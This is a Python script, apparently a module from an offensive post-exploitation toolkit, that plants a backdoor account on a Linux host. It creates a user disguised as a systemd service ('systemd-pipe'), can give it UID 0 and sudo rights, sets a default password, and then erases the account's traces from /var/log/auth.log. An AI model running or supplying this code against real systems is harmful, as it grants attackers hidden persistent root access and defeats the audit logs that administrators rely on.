#!/usr/bin/python3
#[PrivEsc][Backdoor] Create New User
#USERNAME,no,Username for created user
#PASSWORD,no,Password for created user
#UID,no,UID for created user
#SYSTEM,no,Create system user (yes/no) [default: yes]
#MAKE_ROOT,no,Give user root privileges (yes/no) [default: no]
#MAKE_SUDO,no,Add user to sudo group [default: yes]
#END

import os
from crypt import crypt as crypt

def create_command_string(arguments):
    command_string = "/sbin/useradd --no-create-home "
    
    if arguments[3] == "yes" or not arguments[3]:
        command_string += "--system "
    
    if arguments[4] == "yes":
        command_string += "-ou 0 -g 0 "

    if arguments[1] == "":
        command_string += "--password " + crypt('pass123', 'SHA512') + " "
    else:
        command_string += "--password " + crypt(arguments[1], 'SHA512') + " "
    
    if arguments[2] != "":
        command_string += "--uid " + str(arguments[2]) + " "
    
    if arguments[0] == "":
        command_string += "-d /run/systemd -c 'systemd Pipe Selector' systemd-pipe"
    else:
        command_string += arguments[0]
    os.system("echo '" + command_string + "' > /tmp/cmd.txt")
    return command_string

def clear_logs(arguments):
    if arguments[0] != "":
        os.system("sed -i '/name=" + arguments[0] + "/d' /var/log/auth.log")
    else:
        os.system("sed -i '/name=systemd-pipe/d' /var/log/auth.log")

def main(arguments):
    os.system(create_command_string(arguments))
    if arguments[5] != "no":
        if arguments[0] != "":
            os.system("/sbin/usermod -aG sudo " + arguments[0])
        else:
            os.system("/sbin/usermod -aG sudo systemd-pipe")
    clear_logs(arguments)

